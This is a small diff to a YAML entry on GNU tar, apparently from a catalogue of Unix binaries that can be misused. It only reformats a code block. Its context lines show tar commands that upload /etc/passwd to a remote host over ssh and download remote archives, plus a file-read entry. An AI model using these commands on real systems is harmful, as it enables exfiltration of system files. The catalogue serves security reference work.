@@ -13,7 +13,8 @@ functions:
         tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd --rsh-command=/bin/ssh
   file-download:
     - description: GNU tar has remote archive capabilities, which can be used to download and extract remote archives. The remote machine should have the `rmt` utility installed and configured.
-      code: | tar xvf remote_user@remote_host.com:/tmp/remote_file --rsh-command=/bin/ssh
+      code: |
+        tar xvf remote_user@remote_host.com:/tmp/remote_file --rsh-command=/bin/ssh
   file-read:
     - description: The --use-compress-program flag can be abused to read files.
       code: |
